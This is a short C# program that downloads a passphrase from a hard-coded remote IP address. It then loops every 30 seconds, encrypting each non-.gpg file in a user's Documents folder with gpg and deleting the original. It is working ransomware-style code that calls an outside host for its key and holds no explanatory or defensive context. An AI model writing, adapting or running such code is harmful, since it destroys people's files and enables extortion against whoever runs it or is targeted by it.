
var url = "http://123.45.67.189/32ea4fa6920cad997bc340cde/keyfile.txt"; //"http://localhost/keyfile.txt";
HttpClient httpClient = new HttpClient();
using HttpResponseMessage response = await httpClient.GetAsync(url);
response.EnsureSuccessStatusCode();

var result = await response.Content.ReadAsStringAsync();
//Console.WriteLine(result);
string key = result;

do
{
    try
    {
        string[] fileEntries = Directory.GetFiles("/home/user/Documents");

        foreach (string fileName in fileEntries)
        {
            Console.WriteLine(fileName);

            if (!fileName.EndsWith(".gpg"))
            {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "gpg";
                process.StartInfo.Arguments = "--passphrase \"" + key + "\" --batch --quiet --yes -c " + fileName;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                Console.WriteLine(output);
                File.Delete(fileName);
            }
        }

        System.Threading.Thread.Sleep(30000);
    }
    catch (Exception exc)
    {
        Console.WriteLine(exc.Message);
    }
} while (1 == 1);